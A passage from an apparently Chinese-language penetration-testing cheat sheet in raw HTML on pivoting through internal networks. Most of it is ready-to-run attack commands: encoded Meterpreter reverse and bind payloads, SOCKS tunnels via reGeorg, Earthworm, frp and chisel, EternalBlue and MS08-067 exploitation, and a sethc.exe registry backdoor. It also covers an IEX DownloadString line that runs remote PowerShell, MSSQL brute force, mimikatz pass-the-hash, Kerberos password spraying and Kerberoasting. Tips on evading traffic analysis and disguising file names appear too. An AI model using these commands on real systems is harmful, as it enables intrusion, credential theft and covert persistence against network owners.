12138 -qngfNTD 12345 root@192.168.0.107\n</code></pre>\n<p><img data-src=\"329.png\" alt=\"\" /></p>\n<pre><code>隧道建立，可使用代理软件配置攻击机外网IP:12345访问内网\n</code></pre>\n<p><img data-src=\"330.png\" alt=\"\" /></p>\n<h2 id=\"-526\"><a class=\"anchor\" href=\"#-526\">#</a> </h2>\n<h3 id=\"ssh隧道rc4双重加密\"><a class=\"anchor\" href=\"#ssh隧道rc4双重加密\">#</a> SSH 隧道 + rc4 双重加密</h3>\n<pre><code>生成木马\n&gt;msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exe\nMSF设置\n&gt;setg proxies socks5:0.0.0.0:12138\n&gt;use exploit/multi/handler\n&gt;set payload windows/x64/meterpreter/bind_tcp_rc4\n&gt;set rc4password 123456\n&gt;set rhost 10.1.1.97\n&gt;set lport 446\n</code></pre>\n<p><img data-src=\"331.png\" alt=\"\" /></p>\n<h2 id=\"-527\"><a class=\"anchor\" href=\"#-527\">#</a> </h2>\n<h3 id=\"公网ssh隧道local-msf\"><a class=\"anchor\" href=\"#公网ssh隧道local-msf\">#</a> 公网 SSH 隧道 + Local MSF</h3>\n<pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=公网IP LPORT=12138 -f exe –o /var/www/html/1.exe\nHandler监听本地IP:12138\nSSH转发\n&gt;ssh -N -R 12138:本地内网IP:12138 root@公网IP\n</code></pre>\n<h2 id=\"-528\"><a class=\"anchor\" href=\"#-528\">#</a> </h2>\n<h2 id=\"socks4a\"><a class=\"anchor\" href=\"#socks4a\">#</a> socks4a</h2>\n<pre><code>#use auxiliary/server/socks4a\n#set srvhost 0.0.0.0\n#set srvport 1080\n#run\n多层网络\n再多配置个端口\nWin: Proxifier&amp; Sockscap64\nLinux: proxychains&amp; 浏览器\n&amp;\nmeterpreter &gt; ipconfig \nIP Address : 10.1.13.3 \nmeterpreter &gt; run autoroute -s 10.1.13.0/24 \nmeterpreter &gt; run autoroute -p \n10.1.13.0 255.255.255.0 Session 1 \nmeterpreter &gt; bg \nmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexec \nmsf exploit(psexec) &gt; set RHOST 10.1.13.2 \nmsf exploit(psexec) &gt; exploit \n</code></pre>\n<h2 id=\"-529\"><a class=\"anchor\" href=\"#-529\">#</a> </h2>\n<h2 id=\"socks5\"><a class=\"anchor\" href=\"#socks5\">#</a> socks5</h2>\n<pre><code>#use auxiliary/server/socks5\n#set srvhost 0.0.0.0\n#set srvport 1080\n#run\n浏览器\n</code></pre>\n<h2 id=\"-530\"><a class=\"anchor\" href=\"#-530\">#</a> </h2>\n<h2 id=\"基于web的socks5\"><a class=\"anchor\" href=\"#基于web的socks5\">#</a> 基于 web 的 socks5</h2>\n<h2 id=\"-531\"><a class=\"anchor\" href=\"#-531\">#</a> </h2>\n<h3 id=\"regeorg\"><a class=\"anchor\" href=\"#regeorg\">#</a> reGeorg</h3>\n<pre><code>https://github.com/sensepost/reGeorg\n&gt;python reGeorgSocksProxy.py -u http://靶机/tunnel.aspx -l 外网IP -p 10080\n打开Proxifier，更改为脚本指定的端口10080\n</code></pre>\n<p><img data-src=\"332.png\" alt=\"\" /></p>\n<pre><code>或proxychains\n#vim /etc/proxychains.conf\n去掉dynamic_chain注释&gt;添加socks5 127.0.0.1 10080\n</code></pre>\n<p><img data-src=\"333.png\" alt=\"\" /></p>\n<pre><code>或MSF\n&gt;setg proxies socks5:外网IP:10080\n&gt;setg ReverseAllowProxy true 允许反向代理\n</code></pre>\n<p><img data-src=\"334.png\" alt=\"\" /></p>\n<h2 id=\"-532\"><a class=\"anchor\" href=\"#-532\">#</a> </h2>\n<h3 id=\"neo-regeorg\"><a class=\"anchor\" href=\"#neo-regeorg\">#</a> Neo-reGeorg</h3>\n<pre><code>Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器\n$ python3 neoreg.py generate -k password\n</code></pre>\n<p><img data-src=\"335.png\" alt=\"\" /></p>\n<pre><code>伪装页面\n$ python3 neoreg.py generate -k &lt;you_password&gt; --file 404.html\nStep 2. 使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理\n$ python3 neoreg.py -k password -u http://xx/tunnel.php\n$ python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip\n开启代理\n$ python neoreg.py -k &lt;you_password&gt; -l 外网IP -p 10081 -u http://xx/neo-tunnel.aspx\n</code></pre>\n<p><img data-src=\"336.png\" alt=\"\" /><br />\n<img data-src=\"337.png\" alt=\"\" /></p>\n<h2 id=\"-533\"><a class=\"anchor\" href=\"#-533\">#</a> </h2>\n<h3 id=\"abptts端口转发\"><a class=\"anchor\" href=\"#abptts端口转发\">#</a> ABPTTS 端口转发</h3>\n<pre><code>https://github.com/nccgroup/ABPTTS\n端口转发\n&gt;python abpttsfactory.py -o webshell 生成shell\n./webshell目录下生成的相应脚本文件传入目标中\n&gt;python abpttsclient.py -c webshell/config.txt -u &quot;http://目标网址/trans.aspx&quot; -f 攻击机IP:12345/目标IP:3389\n</code></pre>\n<p><img data-src=\"338.png\" alt=\"\" /><br />\n<img data-src=\"339.png\" alt=\"\" /><br />\n<img data-src=\"340.png\" alt=\"\" /></p>\n<pre><code>ABPTTS转发内网其他机器端口\n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389\n</code></pre>\n<p><img data-src=\"341.png\" alt=\"\" /><br />\n<img data-src=\"342.png\" alt=\"\" /></p>\n<pre><code>要转发多个机器或多个端口\n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22\nSSH代理一级网段\n需要一台有权限的Linux靶机\n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22\n&gt;ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107\n</code></pre>\n<p><img data-src=\"343.png\" alt=\"\" /></p>\n<pre><code>配置proxychains即可\n</code></pre>\n<p><img data-src=\"344.png\" alt=\"\" /></p>\n<pre><code>SSH代理二级网段\n需要靶机web权限，一级内网一台web权限\n转发内网web出来传入abptts的shell\n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 \n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22\nSSH连接192.168.0.107:222即可到达二级网络\n反弹msf\nkali生成bind型脚本\n&gt;msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell\n在二级不出网linux上执行\n将他的12138端口通过abptts转出\n&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138\nMsf本地监听13128即可\n</code></pre>\n<h2 id=\"-534\"><a class=\"anchor\" href=\"#-534\">#</a> </h2>\n<h3 id=\"tunna转发\"><a class=\"anchor\" href=\"#tunna转发\">#</a> Tunna 转发</h3>\n<pre><code>&gt;python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 –v\n</code></pre>\n<p><img data-src=\"345.png\" alt=\"\" /></p>\n<h2 id=\"-535\"><a class=\"anchor\" href=\"#-535\">#</a> </h2>\n<h2 id=\"earthworm\"><a class=\"anchor\" href=\"#earthworm\">#</a> Earthworm</h2>\n<p><img data-src=\"346.png\" alt=\"\" /></p>\n<h2 id=\"-536\"><a class=\"anchor\" href=\"#-536\">#</a> </h2>\n<h3 id=\"正向目标机存在外网ip\"><a class=\"anchor\" href=\"#正向目标机存在外网ip\">#</a> 正向 (目标机存在外网 IP)：</h3>\n<pre><code>&gt;ew –s ssocksd –l 888\n连接sockscap64靶机外网IP+端口888\n</code></pre>\n<h2 id=\"-537\"><a class=\"anchor\" href=\"#-537\">#</a> </h2>\n<h3 id=\"反弹socks5目标机无外网ip\"><a class=\"anchor\" href=\"#反弹socks5目标机无外网ip\">#</a> 反弹 socks5 (目标机无外网 IP)：</h3>\n<pre><code>外网攻击机：\n&gt;ew -s rcsocks -l 1008 -e 888\n-l为socks软件连接的端口，-e为目标主机和vps的通信端口。\n靶机:\n&gt;ew -s rssocks -d 外网IP -e 1008 \nsockscap64连接攻击机外网IP+端口1008\n</code></pre>\n<h2 id=\"-538\"><a class=\"anchor\" href=\"#-538\">#</a> </h2>\n<h3 id=\"二级环境a有外网b内网无外网\"><a class=\"anchor\" href=\"#二级环境a有外网b内网无外网\">#</a> 二级环境 (A 有外网，B 内网无外网)：</h3>\n<pre><code>靶机B:\n&gt;ew –s ssocksd –l 888\n靶机A:\n&gt;ew –s lcx_tran –l 1080 –f 靶机B –g 888\nSockscap64连接靶机外网IP+端口 1080\n</code></pre>\n<h2 id=\"-539\"><a class=\"anchor\" href=\"#-539\">#</a> </h2>\n<h3 id=\"二级环境a无外网b内网无外网\"><a class=\"anchor\" href=\"#二级环境a无外网b内网无外网\">#</a> 二级环境 (A 无外网，B 内网无外网)：</h3>\n<pre><code>外网攻击机：\n&gt;ew –s lcx_listen –l 10800 –e 888\n靶机B：\n&gt;ew –s ssocksd –l 999\n靶机A:\n&gt;ew -s lcx_slave -d 外网 -e 8888 -f 靶机B -g 9999 \nSockscap64连接攻击机外网IP+端口 10080\n</code></pre>\n<h2 id=\"-540\"><a class=\"anchor\" href=\"#-540\">#</a> </h2>\n<h3 id=\"三级环境a无外网b内网无外网通ac通b\"><a class=\"anchor\" href=\"#三级环境a无外网b内网无外网通ac通b\">#</a> 三级环境 (A 无外网，B 内网无外网通 A,C 通 B)：</h3>\n<pre><code>外网攻击机：\n&gt;ew -s rcsocks -l 1008 -e 888\n靶机A：\n&gt;ew -s lcx_slave -d 外网攻击机 -e 888 -f 靶机B -g 999\n靶机B：\n&gt;ew -s lcx_listen -l 999 -e 777\n靶机C:\n&gt;ew -s rssocks -d靶机B -e 777\nSockscap64连接攻击机外网IP+端口 1008\n</code></pre>\n<h2 id=\"-541\"><a class=\"anchor\" href=\"#-541\">#</a> </h2>\n<h2 id=\"frp\"><a class=\"anchor\" href=\"#frp\">#</a> Frp</h2>\n<pre><code>https://github.com/fatedier/frp/releases/\n使用条件:目标主机通外网，拥有自己的公网ip\n对攻击机外网服务端frps.ini进行配置\n[common]\nbind_port=8080\n靶机客户端\n[common]\nserver_addr=服务器端外网IP\nserver_port=8080\n[socks5]\ntype=tcp\nremote_port=12345\nplugin=socks5\nuse_encryption=true\nuse_compression=true\n以上是启用加密和压缩，能躲避流量分析设备。\n上传frpc.exe和frpc.ini到目标服务器上,直接运行frpc.exe（在实战中可能会提示找不到配置文件，需要使用-c参数指定配置文件的路径frpc.exe -c 文件路径），可以修改文件名和配置名以混淆视听。\n公网vps主机上运行./frps –c frps.ini\n靶机执行./frpc –c frpc.ini\n</code></pre>\n<p><img data-src=\"347.png\" alt=\"\" /></p>\n<pre><code>MSF中设置全局变量\n&gt;setg proxies 公网IP:12345\n&gt;setg ReverseAllowProxy true 运行反向代理\n</code></pre>\n<p><img data-src=\"348.png\" alt=\"\" /><br />\n<img data-src=\"349.png\" alt=\"\" /></p>\n<pre><code>结束攻击\ntasklist \ntaskkill /pid 进程号 -t –f\n</code></pre>\n<h2 id=\"-542\"><a class=\"anchor\" href=\"#-542\">#</a> </h2>\n<h2 id=\"ssf-2\"><a class=\"anchor\" href=\"#ssf-2\">#</a> SSF</h2>\n<pre><code>https://github.com/securesocketfunneling/ssf/releases\n</code></pre>\n<h2 id=\"-543\"><a class=\"anchor\" href=\"#-543\">#</a> </h2>\n<h3 id=\"正向socks代理\"><a class=\"anchor\" href=\"#正向socks代理\">#</a> 正向 socks 代理</h3>\n<pre><code>边界机器执行：\n&gt;ssfd.exe -p 1080 linux执行：./ssfd -p 1080\n</code></pre>\n<p><img data-src=\"350.png\" alt=\"\" /></p>\n<pre><code>攻击机执行：\n&gt;ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)\n</code></pre>\n<p><img data-src=\"351.png\" alt=\"\" /></p>\n<pre><code>本机配置proxychain或proxifier\n</code></pre>\n<p><img data-src=\"352.png\" alt=\"\" /></p>\n<h2 id=\"-544\"><a class=\"anchor\" href=\"#-544\">#</a> </h2>\n<h3 id=\"反向socks代理\"><a class=\"anchor\" href=\"#反向socks代理\">#</a> 反向 socks 代理</h3>\n<pre><code>攻击机执行：\n&gt;ssfd.exe -p 1080\n</code></pre>\n<p><img data-src=\"353.png\" alt=\"\" /></p>\n<pre><code>内网机器执行：\n&gt;ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)\n</code></pre>\n<p><img data-src=\"354.png\" alt=\"\" /><br />\n<img data-src=\"355.png\" alt=\"\" /></p>\n<h2 id=\"-545\"><a class=\"anchor\" href=\"#-545\">#</a> </h2>\n<h3 id=\"多级级联\"><a class=\"anchor\" href=\"#多级级联\">#</a> 多级级联</h3>\n<pre><code>多级内网机执行：\n&gt;ssfd.exe -p 1080 -c config.json\nJson文件加入字段\n&quot;circuit&quot;: [ \n&#123;&quot;host&quot;: &quot;A中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125;, \n&#123;&quot;host&quot;: &quot;B中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125; \n],\n所有中继机执行：\n&gt;ssfd.exe -p 1080 -c config.json\n边界机器执行：\n&gt;ssf.exe -c config.json -p 1080 多级内网机IP -X 12138\n边界机执行：\n&gt;nc.exe 127.0.0.1 12138即可获得多级内网机cmdshell\n</code></pre>\n<h2 id=\"-546\"><a class=\"anchor\" href=\"#-546\">#</a> </h2>\n<h3 id=\"反弹shell-2\"><a class=\"anchor\" href=\"#反弹shell-2\">#</a> 反弹 shell</h3>\n<pre><code>攻击机执行：\n&gt;ssfd.exe -p 1080 -c config.json\n</code></pre>\n<p><img data-src=\"356.png\" alt=\"\" /></p>\n<pre><code>内网机器执行：\n</code></pre>\n<p><img data-src=\"357.png\" alt=\"\" /></p>\n<pre><code>攻击机执行：\n&gt;nc 127.0.0.1 12138\n</code></pre>\n<p><img data-src=\"358.png\" alt=\"\" /></p>\n<h2 id=\"-547\"><a class=\"anchor\" href=\"#-547\">#</a> </h2>\n<h2 id=\"shadowsocks\"><a class=\"anchor\" href=\"#shadowsocks\">#</a> Shadowsocks</h2>\n<pre><code>https://github.com/shadowsocks/libQtShadowsocks/releases/download/v2.0.2/shadowsocks-libqss-v2.0.2-win64.7z\n靶机新建配置文件1.json，内容为\n&#123;\n&quot;server&quot;:&quot;0.0.0.0&quot;,\n&quot;server_port&quot;:13337,\n&quot;local_address&quot;:&quot;127.0.0.1&quot;,\n&quot;local_port&quot;:1080,\n&quot;password&quot;:&quot;123456&quot;,\n&quot;timeout&quot;:300,\n&quot;method&quot;:&quot;aes-256-cfb&quot;,\n&quot;fast_open&quot;:false,\n&quot;workers&quot;: 1\n&#125;\n执行\n&gt;shadowsocks-libqss.exe -c 1.json –S\n攻击机配置\n</code></pre>\n<p><img data-src=\"359.png\" alt=\"\" /></p>\n<pre><code>浏览器或其他攻击软件配置代理127.0.0.1:1080即可(需有http(s)/socks5功能)\n</code></pre>\n<p><img data-src=\"360.png\" alt=\"\" /><br />\n<img data-src=\"361.png\" alt=\"\" /></p>\n<h2 id=\"-548\"><a class=\"anchor\" href=\"#-548\">#</a> </h2>\n<h2 id=\"goproxy\"><a class=\"anchor\" href=\"#goproxy\">#</a> Goproxy</h2>\n<pre><code>https://github.com/snail007/goproxy/releases\n靶机执行\n&gt;proxy.exe socks -t tcp -p &quot;0.0.0.0:13337&quot;\n</code></pre>\n<p><img data-src=\"362.png\" alt=\"\" /></p>\n<pre><code>攻击机配置Proxifier\n</code></pre>\n<p><img data-src=\"363.png\" alt=\"\" /></p>\n<h2 id=\"-549\"><a class=\"anchor\" href=\"#-549\">#</a> </h2>\n<h2 id=\"chisel-2\"><a class=\"anchor\" href=\"#chisel-2\">#</a> Chisel</h2>\n<pre><code>https://github.com/jpillora/chisel/releases\n攻击机监听\n&gt;chisel.exe server -p 12138 --reverse\n</code></pre>\n<p><img data-src=\"364.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346\n</code></pre>\n<p><img data-src=\"365.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;chisel.exe server -p 12346 --socks5\n</code></pre>\n<p><img data-src=\"366.png\" alt=\"\" /></p>\n<pre><code>攻击机执行\n&gt;chisel.exe client 127.0.0.1:12345 socks\n</code></pre>\n<p><img data-src=\"367.png\" alt=\"\" /></p>\n<pre><code>当隧道建立成功时，攻击机本地会启动1080端口\n</code></pre>\n<p><img data-src=\"368.png\" alt=\"\" /></p>\n<pre><code>即可使用\n</code></pre>\n<h2 id=\"-550\"><a class=\"anchor\" href=\"#-550\">#</a> </h2>\n<h2 id=\"代理软件\"><a class=\"anchor\" href=\"#代理软件\">#</a> 代理软件</h2>\n<pre><code>Sockscap64\nProxifier \nProxychains\n#vim /etc/proxychains.conf\n去掉dynamic_chain注释&gt;添加socks4 127.0.0.1 1080\n#cp /usr/lib/proxychains3/proxyresolv /usr/bin\n</code></pre>\n<h3 id=\"ngrok内网穿透\"><a class=\"anchor\" href=\"#ngrok内网穿透\">#</a> Ngrok 内网穿透</h3>\n<pre><code>https://ngrok.com/\nhttps://www.ngrok.cc/\n下载ngrok\n#ngrok authtoken 授权码\n#ngrok http 8080\n#ngrok tcp 8888\n</code></pre>\n<h3 id=\"ms17-010\"><a class=\"anchor\" href=\"#ms17-010\">#</a> MS17-010</h3>\n<pre><code>扫描\n#use auxiliary/scanner/smb/smb_ms17_010\n#set rhosts 192.168.1.0/24\n&amp;\n#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms17-010.nse 10.11.1.0/20\n攻击\n#use exploit/windows/smb/ms_17_010_eternalblue易蓝屏\n#set payload windows/x64/meterpreter/reverse_tcp\n#use auxiliary/admin/smb/ms17_010_command\n#set command REG ADD \\&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\\&quot; /t REG_SZ /v Debugger /d \\&quot;C:\\\\windows\\\\system32\\\\cmd.exe\\&quot; /f\n</code></pre>\n<h3 id=\"ms08_067\"><a class=\"anchor\" href=\"#ms08_067\">#</a> MS08_067</h3>\n<pre><code>#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms08-067.nse 10.11.1.0/20\n#use exploit/windows/smb/ms08_067_netapi\n#set payload windows/meterpreter/reverse_tcp\nCVE-2019-0708\n</code></pre>\n<h3 id=\"攻击mysql数据库\"><a class=\"anchor\" href=\"#攻击mysql数据库\">#</a> 攻击 MySQL 数据库</h3>\n<pre><code>#use auxiliary/scanner/mysql/mysql_version 主机发现\n#use auxiliary/scanner/mysql/mysql_login MYSQL爆破\n#use exploit/multi/mysql/mysql_udf_payload UDF提权\n#use exploit/windows/mysql/mysql_mof MOF提权\n#use auxiliary/admin/mysql/mysql_sql 执行命令\n</code></pre>\n<h3 id=\"攻击mssql数据库\"><a class=\"anchor\" href=\"#攻击mssql数据库\">#</a> 攻击 MSSQL 数据库</h3>\n<pre><code>&gt;PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot; 列出域内mssql主机\nhttps://github.com/NetSPI/PowerUpSQL\n&gt;Get-SQLInstanceLocal          #发现本机SQLServer实例\n&gt;Get-SQLInstanceDomain         #发现域中的SQLServer实例\n&gt;Get-SQLInstanceBroadcast      #发现工作组SQLServer实例\n&gt;$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; 工作组mssql爆破\n&gt;$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; \n&gt;Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw –Verbose\n&gt;$Targets 域内MSSQL爆破\nNishang脚本爆破MSSQL\n&gt;Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\\test\\users.txt -PasswordList C:\\test\\wordlist.txt -Service SQL -Verbose -StopOnSuccess\n#use auxiliary/scanner/mssql/mssql_login 爆破主机\n#use auxiliary/admin/mssql/mssql_exec 调用cmd\n#use auxiliary/admin/mssql/mssql_sql 执行SQL语句\n#use exploit/windows/mssql/mssql_payload 上线MSSQL主机\nhttp://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1\n导入nishang执行MSSQL命令的脚本\n&gt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1')\n&gt;Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin 会返回powershell\n#use auxiliary/scanner/mssql/mssql_hashdump 导出MSSQL密码\n已知服务器ntlmhash，未知mssql账号密码\nHash注入+socks无密码连接mssql\n&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:. /ntlm:&#123;hash&#125; /run:\\&quot;C:\\*\\SocksCap64\\SocksCap64_RunAsAdmin.exe\\&quot;&quot; &quot;exit&quot;\n将SSMS.exe加入sockscap中启动\n命令行版sqltool\nhttps://github.com/uknowsec/SharpSQLTools\n</code></pre>\n<h3 id=\"隔离主机payload\"><a class=\"anchor\" href=\"#隔离主机payload\">#</a> 隔离主机 payload</h3>\n<pre><code>隔离主机一般与攻击机无双向路由，payload设置为bind让靶机监听。\n&gt;set payload windows/meterpreter/bind_tcp\n&gt;set RHOST 隔离机IP\n</code></pre>\n<p><img data-src=\"369.png\" alt=\"\" /></p>\n<h3 id=\"爆破-3\"><a class=\"anchor\" href=\"#爆破-3\">#</a> 爆破</h3>\n<h2 id=\"-551\"><a class=\"anchor\" href=\"#-551\">#</a> </h2>\n<h2 id=\"hydra\"><a class=\"anchor\" href=\"#hydra\">#</a> Hydra</h2>\n<pre><code>参数：\n-l 指定的用户名 -p 指定密码\n-L 用户名字典  -P 密码字典\n-s 指定端口 -o 输出文件\n&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql\n&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4\n&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv\n&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V\n&gt;hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV\n&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10\n</code></pre>\n<h2 id=\"-552\"><a class=\"anchor\" href=\"#-552\">#</a> </h2>\n<h2 id=\"medusa\"><a class=\"anchor\" href=\"#medusa\">#</a> Medusa</h2>\n<pre><code>参数：\n-h 目标名或IP  -H 目标列表\n-u 用户名 -U 用户名字典\n-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程\n-n 指定端口 -e ns 尝试空密码和用户名密码相同\n&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql\n&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql\n</code></pre>\n<h2 id=\"-553\"><a class=\"anchor\" href=\"#-553\">#</a> </h2>\n<h2 id=\"域内爆破\"><a class=\"anchor\" href=\"#域内爆破\">#</a> 域内爆破</h2>\n<h2 id=\"-554\"><a class=\"anchor\" href=\"#-554\">#</a> </h2>\n<h3 id=\"kerbrute\"><a class=\"anchor\" href=\"#kerbrute\">#</a> Kerbrute</h3>\n<pre><code>https://github.com/ropnop/kerbrute\n用户枚举\n&gt;kerbrute_windows_amd64.exe userenum -d zone.com username.txt\n</code></pre>\n<p><img data-src=\"371.png\" alt=\"\" /><br />\n密码喷射<br />\n &gt; kerbrute_windows_amd64.exe passwordspray -d <span class=\"exturl\" data-url=\"aHR0cDovL3pvbmUuY29t\">zone.com</span> use.txt password<br />\n<img data-src=\"372.png\" alt=\"\" /></p>\n<pre><code>密码爆破\n此项会产生日志\n&gt;kerbrute_windows_amd64.exe bruteuser -d zone.com pass.txt name\n</code></pre>\n<p><img data-src=\"373.png\" alt=\"\" /></p>\n<pre><code>组合爆破\n格式为username:password\n&gt;kerbrute_windows_amd64.exe -d zone.com bruteforce com.txt\n</code></pre>\n<h2 id=\"-555\"><a class=\"anchor\" href=\"#-555\">#</a> </h2>\n<h3 id=\"domainpasswordspray\"><a class=\"anchor\" href=\"#domainpasswordspray\">#</a> DomainPasswordSpray</h3>\n<pre><code>https://github.com/dafthack/DomainPasswordSpray\n自动收集账户进行密码喷射\n&gt;Invoke-DomainPasswordSpray -Password pass\n</code></pre>\n<p><img data-src=\"374.png\" alt=\"\" /></p>\n<pre><code>组合爆破\n&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -PasswordList passlist.txt -OutFile result.txt\n会产生日志\n单密码\n&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -Password password\n</code></pre>\n<h3 id=\"方程式内网不产生session\"><a class=\"anchor\" href=\"#方程式内网不产生session\">#</a> 方程式内网不产生 session</h3>\n<pre><code>msfvenom生成一个x64或x86的dll文件，替换该工具下的x64.dll或x86.dll\nwindows server 2008 ，msfvenom生成x64.dll文件\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x64.dll\nmsf配置\nuse exploit/multi/handler \nset payload windows/x64/meterpreter/reverse_tcp\nset lport 12345\nset lhost 192.168.0.107\n将该x64.dll替换到方程式利用工具下面。\n只需要更换目标的IP，就可以获取session。\nwindows server 2003 ，msfvenom生成x86.dll文件\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x86.dll\nmsf配置\nuse exploit/multi/handler \nset payload windows/meterpreter/reverse_tcp\nset lport 12345\nset lhost 192.168.0.107\n通过ms17_010_commend模块执行系统命令添加用户至管理员。再指定SMBPass和SMBUser来建立windows可访问命名管道\n</code></pre>\n<h3 id=\"kerberoasting\"><a class=\"anchor\" href=\"#kerberoasting\">#</a> Kerberoasting</h3>\n<pre><code>https://github.com/nidem/kerberoast \n</code></pre>\n<h2 id=\"-556\"><a class=\"anchor\" href=\"#-556\">#</a> </h2>\n<h2 id=\"spn发现\"><a class=\"anchor\" href=\"#spn发现\">#</a> SPN 发现</h2>\n<h2 id=\"-557\"><a class=\"anchor\" href=\"#-557\">#</a> </h2>\n<h3 id=\"cmd-4\"><a class=\"anchor\" href=\"#cmd-4\">#</a> cmd</h3>\n<pre><code>&gt;setspn -T 域名 -Q */*\n</code></pre>\n<p><img data-src=\"375.png\" alt=\"\" /></p>\n<h2 id=\"-558\"><a class=\"anchor\" href=\"#-558\">#</a> </h2>\n<h3 id=\"powershell-6\"><a class=\"anchor\" href=\"#powershell-6\">#</a> Powershell</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1B5cm9UZWszL1Bvd2VyU2hlbGwtQUQtUmVjb24=\">https://github.com/PyroTek3/PowerShell-AD-Recon</span><br />\n<img data-src=\"376.png\" alt=\"\" /></p>\n<pre><code>Powerview\n&gt;Get-NetComputer -SPN termsrv*\n&gt;Get-NetUser -SPN\n</code></pre>\n<p><img data-src=\"377.png\" alt=\"\" /></p>\n<pre><code>&gt;import module GetUserSPNs.ps1\n</code></pre>\n<h2 id=\"-559\"><a class=\"anchor\" href=\"#-559\">#</a> </h2>\n<h3 id=\"empire-3\"><a class=\"anchor\" href=\"#empire-3\">#</a> Empire</h3>\n<pre><code>&gt;usemodule situational_awareness/network/get_spn\n</code></pre>\n<h2 id=\"-560\"><a class=\"anchor\" href=\"#-560\">#</a> </h2>\n<h2 id=\"申请票据\"><a class=\"anchor\" href=\"#申请票据\">#</a> 申请票据</h2>\n<pre><code>&gt;Add-Type -AssemblyName System.IdentityModel\n&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN&quot;\n&amp;\n&gt;kerberos::ask /target:SPN\n</code></pre>\n<h2 id=\"-561\"><a class=\"anchor\" href=\"#-561\">#</a> </h2>\n<h2 id=\"导出票据\"><a class=\"anchor\" href=\"#导出票据\">#</a> 导出票据</h2>\n<pre><code>mimikatz&gt;kerberos::list /export\n</code></pre>\n<h2 id=\"-562\"><a class=\"anchor\" href=\"#-562\">#</a> </h2>\n<h2 id=\"破解密码\"><a class=\"anchor\" href=\"#破解密码\">#</a> 破解密码</h2>\n<pre><code>&gt;python tgsrepcrack.py word.txt file.kirbi\nhttps://github.com/leechristensen/tgscrack\n&gt;python extractServiceTicketParts.py file.kirbi\n&gt;tgscrack.exe -hashfile hash.txt -wordlist word.txt\n</code></pre>\n<h2 id=\"-563\"><a class=\"anchor\" href=\"#-563\">#</a> </h2>\n<h2 id=\"重写票据\"><a class=\"anchor\" href=\"#重写票据\">#</a> 重写票据</h2>\n<pre><code>&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -u 500\n&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -g 512\n注入内存、\n&gt;kerberos::ptt new.kirbi\n</code></pre>\n<h2 id=\"-564\"><a class=\"anchor\" href=\"#-564\">#</a> </h2>\n<h2 id=\"getuserspns\"><a 